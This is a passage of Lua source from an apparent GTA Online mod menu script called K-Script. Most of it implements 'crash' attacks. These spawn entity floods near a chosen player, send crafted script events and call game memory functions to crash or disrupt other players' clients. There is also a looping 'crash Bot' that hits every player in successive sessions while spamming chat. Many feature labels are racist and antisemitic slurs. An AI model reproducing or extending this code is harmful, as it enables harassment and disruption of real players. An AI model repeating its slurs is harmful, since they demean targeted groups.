  for _ = 1, 170 do
    local x, y, z = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(targetPed, 0, 3, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(targetPed) - 180
    local vehicle = GTA.SpawnVehicle(vehicleModel, x, y, z + 55.0, heading, true, true)
    if vehicle and vehicle ~= 0 then
      spawned[#spawned + 1] = vehicle
      canMigrate(vehicle, false)
      setEntProofs(vehicle)
    end
    Script.Yield(20)
  end

  Script.Yield(1000)
  deleteEntityList(spawned, 5)
  ENTITY.FREEZE_ENTITY_POSITION(localPed, false)
  ENTITY.SET_ENTITY_COORDS_NO_OFFSET(localPed, original.x, original.y, original.z, false, false, false)
  endActionCooldown("Genius crash")
end

function runTempVehicleAction(playerId)
  local vehicle = spawnVehicleNearPlayer(playerId, "proptrailer", 0, 0)
  Script.Yield(1500)
  DeleteEnt(vehicle)
end

registerPedActionFeature("zerocrash", "Overfuck crash", playerZerocrash, false, "makes some uwu stuff with their game")
registerPedActionFeature("ncrash", "El Manuel crash", runElManuelcrash, false, "crashes the selected player.")
registerPedActionFeature("standcrash", "Gen4 crash", runGen4crash, true, "crashes the selected player. (This crash isnt targetted and will more than likely crash people arround the Target!)")
registerPedActionFeature("pBigBraincrash", "Big Brain crash", function(playerId) runBigBraincrash(playerId, "Big Brain crash") end, true)
registerPedActionFeature("pBigBraincrashV8", "Big Brain crash", function(playerId) runBigBraincrash(playerId, "Big Brain crash") end, true)
registerPedActionFeature("pBigBraincrashV7", "Big Brain crash", function(playerId) runBigBraincrash(playerId, "Big Brain crash") end, true)
registerPedActionFeature("vehlightCwash", "Genius crash", runGeniuscrash, true, "Can crash Players in the Area, op cwash frfr, may need to use multiple times")
registerPedActionFeature("invalidPoolDelete0", "Invalid Pool Delete", playerZerocrash, true)
registerPedActionFeature("TempVehicle3", "Temp Vehicle Action", runTempVehicleAction, false)

function runGoofySpoof(playerId)
  spoofedPid[playerId] = true
  local spawned = {}
  local targetPed = playerPedHandle(playerId)
  if not targetPed then
    spoofedPid[playerId] = false
    notify("Goofy Goober crash failed, be near them.")
    return
  end

  for _ = 1, 6 do
    local modelName = randomCars[math.random(#randomCars)]
    local x, y, z = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(targetPed, 0, 3, 0)
    local model = Utils.Joaat(modelName)
    request_model(model)
    local vehicle = GTA.SpawnVehicle(model, x, y, z + 200, 0, true, true)
    if vehicle then
      local pointer = GTA.HandleToPointer(vehicle)
      local attempts = 0
      while attempts < 20 and pointer and pointer.NetObject == nil and not ShouldUnload() do
        attempts = attempts + 1
        pointer = GTA.HandleToPointer(vehicle)
        Script.Yield(15)
      end

      if pointer and pointer.NetObject then
        table.insert(spoofedVehicle, pointer.NetObject.ObjectID)
      end

      table.insert(spawned, vehicle)
      pcall(GTA.GiveControl, playerId, vehicle)
    end
    Script.Yield(350)
  end

  Script.Yield(5000)
  deleteEntityList(spawned, 20)
  spoofedVehicle = {}
  spoofedPid[playerId] = false
end

ensureButtonPlayerFeature("goofycrash", "Goofy Goober crash", "Spectate them/be near", function(feature)
  local playerId = resolveActionTarget(feature, "Goofy Goober crash", true)
  if playerId then
    logPlayerAction("Goofy Goober crash", playerId)
    Script.QueueJob(runGoofySpoof, playerId)
  end
end)

ensureButtonPlayerFeature("synccrash", "TV crash", "Need to be near the Target", function(feature)
  local playerId = resolveActionTarget(feature, "TV crash", false)
  if not playerId then
    return
  end

  Script.QueueJob(function()
    logPlayerAction("TV crash", playerId)
    spoofedPid[playerId] = true
    local position = targetPosition(playerId)
    if not position then
      spoofedPid[playerId] = false
      return
    end

    local ped = GTA.CreateRandomPed(position.x, position.y, position.z)
    local pointer = GTA.HandleToPointer(ped)
    local attempts = 0
    while attempts < 20 and pointer and pointer.NetObject == nil and not ShouldUnload() do
      attempts = attempts + 1
      pointer = GTA.HandleToPointer(ped)
      Script.Yield(15)
    end
    if pointer and pointer.NetObject then
      spoofedPed = pointer.NetObject.ObjectID
    end
    TASK.TASK_COWER(ped, 5000)
    Script.Yield(10000)
    DeleteEnt(ped)
    spoofedPed = 0
    spoofedPid[playerId] = false
  end)
end)

function registerSimplePlayerToggle(id, label, onStart, onStop, privileged, description)
  ensureTogglePlayerFeature(id, label, description or "", function(feature)
    local playerId = selectedPlayerIdFromFeature(feature)
    if not feature:IsToggled() then
      if onStop then
        onStop(playerId)
      end
      return
    end

    playerId = resolveActionTarget(feature, label, privileged)
    if not playerId then
      feature:SetValue(false)
      return
    end

    if onStart then
      onStart(playerId, feature)
    end
  end, true)
end

function runLexisGoBrrrrToggle(playerId, feature)
  if oncrashCooldown and not isDev then
    notify("Another crash is running, please wait for it to Finish!")
    feature:SetValue(false)
    return
  end

  spoofedPid[playerId] = true
  logPlayerAction("Lexis go brrrrr", playerId)
  local spawned = {}

  for _ = 1, 6 do
    local position = targetPosition(playerId)
    if position then
      spawned[#spawned + 1] = GTA.CreateRandomPed(position.x, position.y, position.z)
    end
    Script.Yield(100)
  end

  while feature:IsToggled() and not ShouldUnload() do
    Script.Yield(100)
  end

  deleteEntityList(spawned, 10)
  spoofedPid[playerId] = false
end

registerSimplePlayerToggle("rapeLexis", "Lexis go brrrrr", function(playerId, feature)
  Script.QueueJob(runLexisGoBrrrrToggle, playerId, feature)
end, function(playerId)
  if playerId then spoofedPid[playerId] = false end
end, true, "#FuckLexis\n\nMay need to Teleport to them/Be near.")

for _, id in ipairs({"InvalidPhoneGesture6", "InvalidPhoneGesture7", "InvalidPhoneGesture8"}) do
  registerSimplePlayerToggle(id, "Calling 2056 crash", function(playerId)
    spoofedPid[playerId] = true
  end, function(playerId)
    if playerId then spoofedPid[playerId] = false end
  end, true, "Be near the target.")
end

for _, id in ipairs({"InvalidMComp4", "InvalidMComp5", "InvalidMComp7"}) do
  registerSimplePlayerToggle(id, "Gas Chamber crash", function(playerId)
    spoofedPid[playerId] = true
  end, function(playerId)
    if playerId then spoofedPid[playerId] = false end
  end, true, "Send them Lexis Users to the Chamber frfr")
end

ensureButtonPlayerFeature("invflag", "Infinite George Floyd Moment", "Make em niggas infinitely run outta oxygen fr", function(feature)
  local playerId = resolveActionTarget(feature, "Infinite George Floyd Moment", true)
  if not playerId then
    return
  end

  if damageEventFn and Memory.LuaCallCFunction then
    local targetPed = Players.GetCPed(playerId)
    local localPed = Players.GetCPed(GTA.GetLocalPlayerId())
    if targetPed and localPed then
      local targetAddress = targetPed:GetAddress()
      local localAddress = localPed:GetAddress()
      Memory.LuaCallCFunction(damageEventFn, localAddress, targetAddress, targetAddress + 144, 0, 1, Utils.sJoaat("weapon_tranquilizer"), 0, 0, 0, 524288 | 4096, 0, 0, 0, 0, 0, 0, 0, V3.New())
    end
  else
    notify("Damage helper is unavailable in this build.")
  end
end, true)

function runAttachmentStressToggle(playerId, feature, profile)
  local cam = nil
  if CAM.CREATE_CAM then
    cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
    activeScriptCam = cam
    CAM.RENDER_SCRIPT_CAMS(true, true, 1000, true, true, true)
    CAM.SET_CAM_ACTIVE(cam, true)
  end

  STREAMING.SET_FOCUS_POS_AND_VEL(0, 0, 10000, 0, 0, 0)
  local iterations = 0

  while feature:IsToggled() and not ShouldUnload() and iterations < 150 do
    iterations = iterations + 1
    local spawned = {}
    local position = targetPosition(playerId)
    if position then
      for _, model in ipairs(profile.objects) do
        local entity = spawnObjectNearPlayer(playerId, model, 0)
        if entity then spawned[#spawned + 1] = entity end
      end

      for _, model in ipairs(profile.vehicles or {}) do
        local vehicle = spawnVehicleNearPlayer(playerId, model, 0, 0)
        if vehicle then spawned[#spawned + 1] = vehicle end
      end

      for _, model in ipairs(profile.peds) do
        local ped = GTA.CreatePed(Utils.Joaat(model), 26, position.x, position.y, position.z, 0)
        if ped then spawned[#spawned + 1] = ped end
      end

      Script.Yield(80)
      for index = 2, #spawned do
        pcall(ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY, spawned[index - 1], spawned[index], 0, 0, 0, 0, 7, 0, 0, 0, 0, 0, 0, 1000, true, true, true, true, 2)
      end
      Script.Yield(25)
      deleteEntityList(spawned)
    end
    Script.Yield(10)
  end

  if cam then
    CAM.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
    CAM.SET_CAM_ACTIVE(cam, false)
    CAM.DESTROY_ALL_CAMS(false)
  end
  STREAMING.CLEAR_FOCUS()
  setPlayerToggleOff(profile.id, playerId)
end

registerSimplePlayerToggle("tugspam", "Tugi Tug!", function(playerId, feature)
  Script.QueueJob(runAttachmentStressToggle, playerId, feature, {
    id = "tugspam",
    objects = {"prop_drug_bottle"},
    vehicles = {"tug", "tug", "Squalo", "barracks4"},
    peds = {"A_F_Y_Hipster_46", "A_F_Y_Hipster_34", "A_F_Y_Hipster_36"},
  })
end, nil, true)

registerSimplePlayerToggle("spongebobc", "Spongebob crash", function(playerId, feature)
  Script.QueueJob(runAttachmentStressToggle, playerId, feature, {
    id = "spongebobc",
    objects = {"prop_drug_bottle", "m78_6_prop_m86_magnethoist_56a", "v_ilev_fh_frntdoor", "prop_large_gold"},
    peds = {"A_F_Y_Hipster_57", "A_F_Y_Hipster_56", "A_F_Y_Hipster_36"},
  })
end, nil, true)

for _, definition in ipairs({
  {"lexisSkid", "Yeet Em!", runYeetEmcrash, false, "crashes the selected player."},
  {"lexisSkid1", "Yeet Em!", runYeetEmcrash, false, "crashes the selected player."},
  {"1/33 cwash", "1/33 Cwash", niggercrash, true},
  {"niggercrash", "nigger crash", niggercrash, true, "i literally made this when i was stoned as shit...\nnigger crash ON TOP!"},
}) do
  registerPedActionFeature(definition[1], definition[2], definition[3], definition[4], definition[5])
end

ensureInputTextPlayerFeature("PlayerNote", "Player Note", "Add a note to the selected player.")

ensureButtonPlayerFeature("SavePlayerNote", "Save Player Note", "Saves the note for the selected player.", function(feature)
  local playerId = resolveActionTarget(feature, "Save Player Note", false)
  if not playerId then
    return
  end

  local noteFeature = FeatureMgr.GetFeature(featureHash("PlayerNote"), playerId)
  if not noteFeature or not noteFeature.GetStringValue then
    notify("Player note feature not found.")
    return
  end

  local note = noteFeature:GetStringValue()
  local player = Players.GetById(playerId)
  local gamerInfo = player and player:GetGamerInfo()
  if not gamerInfo then
    notify("Failed to get Rockstar ID.")
    return
  end

  local notes = loadPlayerNotes()
  local key = tostring(gamerInfo.RockstarId)
  notes[key] = {
    rockstar_id = gamerInfo.RockstarId,
    rockstarId = gamerInfo.RockstarId,
    player_name = Players.GetName(playerId) or "Unknown",
    playerName = Players.GetName(playerId) or "Unknown",
    note = note,
    GameVersion = isGameVersionEnhanced and "Enhanced" or "Legacy",
    last_seen = os.time(),
    updatedAt = os.time(),
  }

  savePlayerNotes(notes)
  notify(("Saved note for %s"):format(Players.GetName(playerId) or tostring(playerId)))
end)

ensureTogglePlayerFeature("Invalid claim notification", "Invalid claim notification", "", function(feature)
  if not feature:IsToggled() then
    return
  end

  Script.QueueJob(function()
    local playerId = resolveActionTarget(feature, "Invalid claim notification", false)
    if not playerId then
      feature:SetValue(false)
      return
    end

    while feature:IsToggled() and not ShouldUnload() do
      GTA.TriggerScriptEvent(1 << playerId, SCRIPT_EVENT.SCRIPT_EVENT_TICKER_MESSAGE, GTA.GetLocalPlayerId(), 16777216, -994541138, 1, 0, 0, 0, 0, 0, 0, 2096820586, 0, 0, 0)
      Script.Yield(10)
    end
  end)
end)

local antiOppressor = FeatAdd(Utils.Joaat("antiopressorloop"), "Anti Oppressor", eFeatureType.Combo, "Automatically detects players using Oppressor Mk II.")
  callFeature(antiOppressor, "SetList", {"None", "Delete Vehicle", "Kick from Vehicle", "Destroy Engine", "Smart Kick", "crash"})
callFeature(antiOppressor, "SetListIndex", 0)
ensureToggleFeature("exclfriendsantiopressorloop", "Exclude Friends", "Excludes friends from Anti Oppressor.", false)

if not kscriptMissingFeatureConfigReloadQueued then
  Script.QueueJob(function()
    Script.Yield(1000)
    if not executingSettingsLoad then
      loadDefaultConfig()
    end
  end)
  kscriptMissingFeatureConfigReloadQueued = true
end

kscriptRecoveredOptionMetadata = kscriptRecoveredOptionMetadata or {}

function rememberRecoveredOption(id, label, description)
  if id == nil then
    return
  end

  kscriptRecoveredOptionMetadata[id] = {
    label = label or id,
    description = description or "",
  }

  if registeredFeatures and registeredFeatures.hashAndName then
    registeredFeatures.hashAndName[featureHash(id)] = label or id
  end
end

function ensureInputTextFeature(id, label, description, callback)
  if isRegisteredFeature(id, false) then
    return FeatureMgr.GetFeature(featureHash(id))
  end

  return FeatAdd(featureHash(id), label, eFeatureType.InputText, description or "", callback or function()
  end)
end

rememberRecoveredOption("invflag", "Infinite George Floyd Moment", "Make em niggas infinitely run outta oxygen fr")
rememberRecoveredOption("lexisSkid7", "Screen go boom!", "Works on some Menus")
rememberRecoveredOption("OPTrollingCarfrfr", "Spawn troll RC Car", "")
rememberRecoveredOption("InvalidPhoneGesturev43", "Calling Terry Davis crash", "")
rememberRecoveredOption("interactionLoop", "Interaction Menu Loop", "Repeatedly opens their Interaction Menu lolz")
rememberRecoveredOption("rapeLexis", "Lexis go brrrrr", "#FuckLexis\n\nMay need to Teleport to them/Be near.")
rememberRecoveredOption("goofycrash", "Goofy Goober crash", "Spectate them/be near")
rememberRecoveredOption("synccrash", "TV crash", "Need to be near the Target")
rememberRecoveredOption("remotehostkick", "Shared Host Kick", "Remotely Host Kicks People if another K-Script User is the Session Host.")
rememberRecoveredOption("remoteunload", "Remotely Unload K-Script!", "Remotely unloads K-Script from a K-Script User!")
rememberRecoveredOption("remotecrash", "Remotely crash K-Script!", "Remotely crashes a K-Script User!")
rememberRecoveredOption("tugspam", "Tugi Tug!", "")
rememberRecoveredOption("spongebobc", "Spongebob crash", "")

function runRcBanditoTroll(playerId)
  local targetPed = playerPedHandle(playerId)
  local position = targetPosition(playerId)
  if not targetPed or not position then
    notify("Target is too far away or invalid.")
    return
  end

  local model = Utils.Joaat("rcbandito")
  request_model(model)

  local vehicle = GTA.SpawnVehicle(model, position.x + math.random(-3, 3), position.y + math.random(-3, 3), position.z + 1.0, 100, true, true)
  if not vehicle or vehicle == 0 or not ENTITY.DOES_ENTITY_EXIST(vehicle) then
    notify("Failed to spawn RC car.")
    return
  end

  ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
  VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
  ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)

  local driver = GTA.CreateRandomPed(position.x, position.y, position.z)
  if not driver or driver == 0 or not ENTITY.DOES_ENTITY_EXIST(driver) then
    notify("Failed to create RC driver.")
    DeleteEnt(vehicle)
    return
  end

  ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
  PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
  PED.SET_PED_COMBAT_ATTRIBUTES(driver, 5, true)
  PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
  PED.SET_PED_KEEP_TASK(driver, true)
  PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
  pcall(TASK.SET_DRIVE_TASK_DRIVING_STYLE, driver, 524859)
  pcall(PED.SET_DRIVER_ABILITY, driver, 1.0)
  pcall(PED.SET_DRIVER_AGGRESSIVENESS, driver, 1.0)

  Script.QueueJob(function()
    for _ = 1, 45 do
      if ShouldUnload() or not ENTITY.DOES_ENTITY_EXIST(vehicle) or not ENTITY.DOES_ENTITY_EXIST(driver) or not ENTITY.DOES_ENTITY_EXIST(targetPed) then
        return
      end

      pcall(TASK.TASK_VEHICLE_MISSION_PED_TARGET, driver, vehicle, targetPed, 6, 100.0, 786469, 5.0, 5.0, true)
      Script.Yield(1000)
    end
  end)

  pcall(STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED, model)
  notify("Aggressive RC car deployed.")
end

ensureButtonPlayerFeature("OPTrollingCarfrfr", "Spawn troll RC Car", "", function(feature)
  local playerId = resolveActionTarget(feature, "Spawn troll RC Car", true)
  if playerId then
    logPlayerAction("Spawn troll RC Car", playerId)
    Script.QueueJob(runRcBanditoTroll, playerId)
  end
end, true)

ensureButtonPlayerFeature("lexisSkid7", "Screen go boom!", "Works on some Menus", function(feature)
  local playerId = resolveActionTarget(feature, "Screen go boom", false)
  if not playerId then
    return
  end

  logPlayerAction("Screen go boom", playerId)
  GTA.TriggerScriptEvent(1 << playerId, -1321657966, GTA.GetLocalPlayerId(), 2, 0, 1, -1, 1, -1, 0, 0, 0)
  notify("Done.")
end)

function runSingleplayerWarp(playerId)
  GTA.TriggerScriptEvent(1 << playerId, -800312339, GTA.GetLocalPlayerId(), 3, 1, 0, 26)
  notify("Done.")
end

ensureButtonPlayerFeature("singleplayerwarp6", "Dispatch to Singleplayer!", "", function(feature)
  local playerId = resolveActionTarget(feature, "Dispatch to Singleplayer", true)
  if playerId then
    logPlayerAction("Dispatch to Singleplayer", playerId)
    runSingleplayerWarp(playerId)
  end
end)

ensureButtonPlayerFeature("singleplayerwarp9", "Dispatch to Singleplayer!", "", function(feature)
  local playerId = resolveActionTarget(feature, "Dispatch to Singleplayer", true)
  if playerId then
    logPlayerAction("Dispatch to Singleplayer", playerId)
    runSingleplayerWarp(playerId)
  end
end)

function teleportLocalPlayerToTarget(playerId)
  local position = targetPosition(playerId)
  if not position then
    notify("Target position unavailable.")
    return false
  end

  ENTITY.SET_ENTITY_COORDS(getPlayerPed(), position.x, position.y, position.z, false, false, false)
  return true
end

ensureButtonPlayerFeature("RemoteTP", "Remote TP", "Teleport to the selected player.", function(feature)
  local playerId = resolveActionTarget(feature, "Remote TP", true)
  if playerId and teleportLocalPlayerToTarget(playerId) then
    logPlayerAction("Remote TP", playerId)
  end
end)

ensureTogglePlayerFeature("AutoTPToPlayer", "Auto TP To Player", "", function(feature)
  if not feature:IsToggled() then
    return
  end

  Script.QueueJob(function()
    local playerId = resolveActionTarget(feature, "Auto TP To Player", true)
    if not playerId then
      feature:SetValue(false)
      return
    end

    while feature:IsToggled() and not ShouldUnload() do
      teleportLocalPlayerToTarget(playerId)
      Script.Yield(50)
    end
  end)
end, true)

function runTerryDavisSessionAction()
  if oncrashCooldown and not isDev then
    notify("There is an active action cooldown, please wait.")
    return
  end

  local ped = getPlayerPed()
  if ped == nil or ped == 0 then
    return
  end

  if not isDev then
    for playerId = 0, 31 do
      if playerId ~= GTA.GetLocalPlayerId() then
        local player = Players.GetById(playerId)
        local gamerInfo = player and player:GetGamerInfo()
        if gamerInfo and blacklistRIDList[gamerInfo.RockstarId] then
          notify(("Cannot use action while protected player %s is in the session."):format(Players.GetName(playerId) or tostring(playerId)))
          blacklistSound()
          return
        end
      end
    end
  end

  Script.QueueJob(function()
    if not beginActionCooldown("Calling Terry Davis action") then
      return
    end

    SendToDiscord("action", ("%s used Calling Terry Davis action against the session with UID %i, isSupporter: %s"):format(
      PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()) or "Unknown",
      Cherax.GetUID(),
      tostring(isSupporter)
    ))

    local weapons = {
      Utils.Joaat("WEAPON_ASSAULTSHOTGUN"),
      Utils.Joaat("WEAPON_PUMPSHOTGUN"),
      Utils.Joaat("WEAPON_PUMPSHOTGUN_MK2"),
    }
    local deadline = Time.GetEpocheMs() + 1500

    while Time.GetEpocheMs() < deadline and not ShouldUnload() do
      MOBILE.CREATE_MOBILE_PHONE(1)
      MOBILE.CELL_CAM_ACTIVATE(true, true)
      pcall(MOBILE.CELL_CAM_ACTIVATE_SELFIE_MODE)
      WEAPON.GIVE_WEAPON_TO_PED(ped, weapons[math.random(#weapons)], 9999, true, true)
      MOBILE.DESTROY_MOBILE_PHONE()
      Script.Yield(75)
      PED.SET_PED_SHOOTS_AT_COORD(ped, 0, 0, 0, false)
      Script.Yield()
    end

    endActionCooldown("Calling Terry Davis action")
  end)
end

ensureButtonFeature("InvalidPhoneGesturev43", "Calling Terry Davis crash", "", function()
  runTerryDavisSessionAction()
end)

function runRayPistolPhoneLoop(playerId, feature)
  if not beginActionCooldown("Calling 2056 action") then
    setPlayerToggleOff("InvalidPhoneGesture4", playerId)
    return
  end

  local targetPed = playerPedHandle(playerId)
  local position = targetPosition(playerId)
  if not targetPed or not position then
    feature:SetValue(false)
    endActionCooldown("Calling 2056 action")
    return
  end

  local shooter = GTA.CreatePed(Utils.Joaat("HC_Driver"), 2, position.x, position.y, position.z + 4.0, 1, true, true)
  if shooter and shooter ~= 0 then
    ENTITY.SET_ENTITY_INVINCIBLE(shooter, true)
    ENTITY.FREEZE_ENTITY_POSITION(shooter, true)
    WEAPON.GIVE_WEAPON_TO_PED(shooter, Utils.Joaat("WEAPON_RAYPISTOL"), 9999, true, true)
  end

  while feature:IsToggled() and not ShouldUnload() and shooter and ENTITY.DOES_ENTITY_EXIST(shooter) do
    position = targetPosition(playerId)
    if position then
      PED.SET_PED_SHOOTS_AT_COORD(shooter, position.x, position.y, position.z, true)
    end
    Script.Yield()
  end

  DeleteEnt(shooter)
  endActionCooldown("Calling 2056 action")
end

function runInvalidComponentLoop(playerId, feature)
  if not beginActionCooldown("Invalid component action") then
    setPlayerToggleOff("InvalidMComp6", playerId)
    return
  end

  local localPed = getPlayerPed()
  local originalPosition = V3.New(ENTITY.GET_ENTITY_COORDS(localPed, false))

  while feature:IsToggled() and not ShouldUnload() do
    local position = targetPosition(playerId)
    if position then
      ENTITY.SET_ENTITY_COORDS_NO_OFFSET(localPed, position.x, position.y, position.z - 25.0, false, false, false)
      PED.SET_PED_COMPONENT_VARIATION(localPed, 3, 0, math.random(0, 2), 0)
    end
    Script.Yield(50)
  end

  ENTITY.SET_ENTITY_COORDS_NO_OFFSET(localPed, originalPosition.x, originalPosition.y, originalPosition.z, false, false, false)
  endActionCooldown("Invalid component action")
end

function registerRecoveredLegacyAliases()
  registerPedActionFeature("pBigBraincrashV3", "Gas The Jews crash", function(playerId) runBigBraincrash(playerId, "Gas The Jews crash") end, true)
  registerPedActionFeature("invalidPoolDelete6", "Invalid Pool Delete", playerZerocrash, true)

  registerSimplePlayerToggle("InvalidPhoneGesture4", "Calling 2056 crash", function(playerId, feature)
    Script.QueueJob(runRayPistolPhoneLoop, playerId, feature)
  end, nil, true, "Be near the target.")

  registerSimplePlayerToggle("InvalidMComp6", "Gas Chamber crash", function(playerId, feature)
    Script.QueueJob(runInvalidComponentLoop, playerId, feature)
  end, nil, true, "Send them Lexis Users to the Chamber frfr")
end

registerRecoveredLegacyAliases()

antiOppressorLastAction = antiOppressorLastAction or {}
antiOppressorLastScan = antiOppressorLastScan or 0

function isRecoveredOppressorModel(model)
  return model == Utils.Joaat("oppressor")
    or model == Utils.Joaat("oppressor2")
    or model == Utils.Joaat("oppressor4")
  end

function getPlayerVehicleHandleAndModel(playerId)
  local cped = Players.GetCPed(playerId)
  if cped and cped.CurVehicle then
    local vehicle = GTA.PointerToHandle(cped.CurVehicle)
    local model = cped.CurVehicle.ModelInfo and cped.CurVehicle.ModelInfo.Model or nil
    if vehicle and vehicle ~= 0 then
      return vehicle, model
    end
  end

  local ped = playerPedHandle(playerId)
  if not ped then
    return nil, nil
  end

  local ok, inVehicle = pcall(PED.IS_PED_IN_ANY_VEHICLE, ped, false)
  if not ok or not inVehicle then
    return nil, nil
  end

  local vehicleOk, vehicle = pcall(PED.GET_VEHICLE_PED_IS_IN, ped, false)
  if not vehicleOk or not vehicle or vehicle == 0 then
    return nil, nil
  end

  local modelOk, model = pcall(ENTITY.GET_ENTITY_MODEL, vehicle)
  return vehicle, modelOk and model or nil
end

function getAntiOppressorMode()
  local feature = safeFeature("antioppressorloop")
  if feature and feature.GetListIndex then
    local ok, index = pcall(feature.GetListIndex, feature)
    if ok then
      return tonumber(index) or 0
    end
  end

  return 0
end

function shouldSkipAntiOppressorPlayer(playerId)
  if playerId == GTA.GetLocalPlayerId() or Players.GetById(playerId) == nil then
    return true
  end

  if isFeatureEnabled("exclfriendsantioppressorloop") then
    local tags = Players.GetTags(playerId) or ""
    if tags:find("%[F%]") ~= nil then
      return true
    end
  end

  return false
end

function applyAntiOppressorAction(playerId, vehicle, mode)
  local now = Time.GetEpocheMs()
  if antiOppressorLastAction[playerId] and now - antiOppressorLastAction[playerId] < 6000 then
    return
  end
  antiOppressorLastAction[playerId] = now

  if mode == 1 then
    DeleteEnt(vehicle)
  elseif mode == 2 then
    local ped = playerPedHandle(playerId)
    if ped then
      TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end
  elseif mode == 3 then
    pcall(VEHICLE.SET_VEHICLE_ENGINE_HEALTH, vehicle, -4000.0)
    pcall(VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH, vehicle, -4000.0)
    pcall(ENTITY.SET_ENTITY_HEALTH, vehicle, 0)
  elseif mode == 4 then
    local ped = playerPedHandle(playerId)
    if ped then
      TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end
    pcall(VEHICLE.SET_VEHICLE_ENGINE_ON, vehicle, false, true, true)
    pcall(VEHICLE.SET_VEHICLE_UNDRIVEABLE, vehicle, true)
  elseif mode == 5 then
    Script.QueueJob(playerZerocrash, playerId)
  end

  notify(("%s is using an Oppressor."):format(Players.GetName(playerId) or tostring(playerId)))
end

function processAntiOppressorLoop()
  local mode = getAntiOppressorMode()
  if mode <= 0 then
    return
  end

  local now = Time.GetEpocheMs()
  if now - antiOppressorLastScan < 750 then
    return
  end
  antiOppressorLastScan = now

  for playerId = 0, 31 do
    if not shouldSkipAntiOppressorPlayer(playerId) then
      local vehicle, model = getPlayerVehicleHandleAndModel(playerId)
      if vehicle and model and isRecoveredOppressorModel(model) then
        applyAntiOppressorAction(playerId, vehicle, mode)
      end
    end
  end
end

safeRegisterLoopedOnce("processAntiOppressorLoop", processAntiOppressorLoop)

crashedsessioncount = crashedsessioncount or 0
crashedplayercount = crashedplayercount or 0

function getcrashLoopMessage()
  local feature = FeatureMgr.GetFeature(featureHash("KScript-crashLoopTextInput"))
  local message = feature and feature.GetStringValue and feature:GetStringValue() or ""
  if message == "" then
    message = "BattlEye sucks lol"
  end
  return message
end

function sendcrashLoopMessage()
  if not isFeatureEnabled("crashLoopTextInputEnabled") then
    return
  end

  local message = getcrashLoopMessage()
  pcall(GTA.SendChatMessageToEveryone, message, false)
  pcall(GTA.AddChatMessageToPool, GTA.GetLocalPlayerId(), message, false)
end

function triggercrashLoopPlayers()
  for playerId = 0, 31 do
    if playerId ~= GTA.GetLocalPlayerId() and Players.GetById(playerId) then
      triggerFeatureByName("Auxiliary Cannon crash", playerId)
      crashedplayercount = crashedplayercount + 1
      Script.Yield(50)
    end
  end
end

function runcrashLoop(feature)
  while feature:IsToggled() and not ShouldUnload() do
    if not NETWORK.NETWORK_IS_SESSION_ACTIVE() then
      feature:SetValue(false)
      notify("You need to be online to use this feature.")
      return
    end

    sendcrashLoopMessage()
    triggercrashLoopPlayers()
    crashedsessioncount = crashedsessioncount + 1

    local sessionType = FeatureMgr.GetFeatureByName and FeatureMgr.GetFeatureByName("Session Type") or nil
    if sessionType and sessionType.SetListIndex then
      sessionType:SetListIndex(0)
    end
    triggerFeatureByName("Start Session")
    Script.Yield(2000)
  end
end

ensureInputTextFeature("KScript-crashLoopTextInput", "Default: BattlEye sucks lol", "")
ensureToggleFeature("crashLoopTextInputEnabled", "Message Spam", "Send the configured message while crash loop is running.", false)
ensureToggleFeature("crashloop", "crash Bot", "The only based way of saying #FUCKBATTLEYE", false, function(feature)
  if not feature:IsToggled() then
    SendToDiscord("action", ("%s(%i) disabled crashbot. Stats: players=%i sessions=%i message=%s"):format(
      PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()) or "Unknown",
      Cherax.GetUID(),
      crashedplayercount,
      crashedsessioncount,
      getcrashLoopMessage()
    ))
    crashedsessioncount = 0
    crashedplayercount = 0
    return
  end

  if not (isSupporter or isAdmin) then
    notify("This feature is for supporters.")
    feature:SetValue(false)
    return
  end

  SendToDiscord("action", ("%s(%i) enabled crashbot."):format(
    PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()) or "Unknown",
    Cherax.GetUID()
  ))
  Script.QueueJob(runcrashLoop, feature)
end)

ensureButtonFeature("crashbot", "crash Bot", "Runs one pass of the session loop action.", function()
  if not (isSupporter or isAdmin) then
    notify("This feature is for supporters.")
    return
  end

  sendcrashLoopMessage()
  triggercrashLoopPlayers()
  notify("crash bot pass complete.")
end)

ensureTogglePlayerFeature("interactionLoop", "Interaction Menu Loop", "Repeatedly opens their Interaction Menu lolz", function(feature)
  if not feature:IsToggled() then
    return
  end

  Script.QueueJob(function()
    local playerId = resolveActionTarget(feature, "Interaction Menu Loop", true)
    if not playerId then
      feature:SetValue(false)
      return
    end

    logPlayerAction("Interaction Menu Loop", playerId)
    while feature:IsToggled() and not ShouldUnload() do
      invitePlayerOntoMission(playerId, 16)
      launchMission(playerId)
      Script.Yield(100)
    end
  end)
end, true)

ensureButtonPlayerFeature("DeletePlayerNote", "Delete Player Note", "Deletes the saved note for the selected player.", function(feature)
  local playerId = selectedPlayerIdFromFeature(feature)
  local player = playerId and Players.GetById(playerId) or nil
  local gamerInfo = player and player:GetGamerInfo()
  if not gamerInfo then
    notify("Failed to get Rockstar ID.")
    return
  end

  if not deletePlayerNote(tostring(gamerInfo.RockstarId)) then
    notify("No note found for selected player.")
  end
end)

ensureButtonFeature("chinatrolltest", "China Troll", "", function()
  SendToDiscord("china", ("China troll action triggered by %s(%i)."):format(
    SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() or "Unknown",
    Cherax.GetUID()
  ))
  for _ = 1, 20 do
    GUI.AddToast("K-Script", "China goes brrrrrrr", 8000, eToastPos.TOP_RIGHT)
    Script.Yield(10)
  end
